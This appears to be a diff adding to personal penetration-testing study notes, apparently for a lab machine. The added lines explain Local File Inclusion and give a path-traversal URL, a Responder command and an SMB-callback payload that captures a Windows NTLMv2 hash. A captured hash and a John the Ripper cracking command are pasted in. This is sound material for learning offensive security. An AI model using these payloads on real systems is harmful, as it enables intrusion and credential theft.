@@ -25,3 +25,23 @@ Wappalyzer is a browser extension that can show you the make up of a website and
 
 sudo nano /etc/hosts  #to edit hosts file
 echo "10.129.128.223 domain.com" | sudo tee -a /etc/hosts  #to add to hosts file directly
+
+LFI or Local File Inclusion occurs when an attacker is able to get a website to include a file that was not
+intended to be an option for this application. A common example is when an application uses the path to a
+file as input. If the application treats this input as trusted, and the required sanitary checks are not
+performed on this input, then the attacker can exploit it by using the ../ string in the inputted file name
+and eventually view sensitive files in the local file system. In some limited cases, an LFI can lead to code
+execution as well.
+http://domain.com/index.php?page=../../windows/system32/drivers/etc/hosts
+
+Responder -I tun0
+http://domain.com/?page=//MY_IP/bogusfilename
+Watch responder to grab user password hash
+Grab hash and save to a file
+echo "Administrator::DESKTOP-H3OF232:1122334455667788:7E0A87A2CCB487AD9B76C7B0AEAEE133:0101000000000000005F3214B534D
+801F0E8BB688484C96C0000000002000800420044004F00320001001E00570049004E002D004E00480045003800440049003400410053004300510004003400570049004E002D004E00480045003800440049003400410
+05300430051002E00420044004F0032002E004C004F00430041004C0003001400420044004F0032002E004C004F00430041004C0005001400420044004F0032002E004C004F00430041004C0007000800005F3214B534D
+801060004000200000008003000300000000000000001000000002000000C2FAF941D04DCECC6A7691EA92630A77E073056DA8C3F356D47C324C6D6D16F0A0010000000000000000000000000000000000009002000630
+06900660073002F00310030002E00310030002E00310034002E00320035000000000000000000" > hash.txt
+Try to crack the hash with a wordlist using John the ripper
+john -w=/usr/share/wordlists/rockyou.txt hash.txt
